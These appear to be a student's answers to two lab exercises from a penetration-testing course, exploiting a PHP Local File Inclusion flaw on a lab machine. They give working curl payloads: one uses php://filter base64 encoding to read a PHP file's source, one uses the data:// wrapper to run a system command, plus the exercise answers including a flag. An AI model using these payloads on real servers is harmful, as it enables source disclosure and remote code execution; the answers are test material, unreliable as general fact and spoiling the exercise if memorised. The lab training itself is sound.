1. Exploit the Local File Inclusion vulnerability on WEB18 (VM #1) by using the php://filter with base64 encoding to include the contents of the /var/www/html/backup.php file with Burp or curl. Copy the output, decode it, and find the flag.

OS{aa163e579cc64c8d2a4838b943ce29ca}

curl [http://192.168.120.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php](http://192.168.120.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php)

echo "" | base64 -d

1. Follow the steps above and use the data:// PHP Wrapper in combination with the URL encoded PHP snippet we used in this section to execute the uname -a command on WEB18 (VM #1). Enter the Linux kernel version as answer.

5.4.0-212-generic

curl "[http://192.168.120.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>](http://192.168.120.16/meteor/index.php?page=data://text/plain,%3c?php%20echo%20system\('uname%20-a'\);?%3e)"
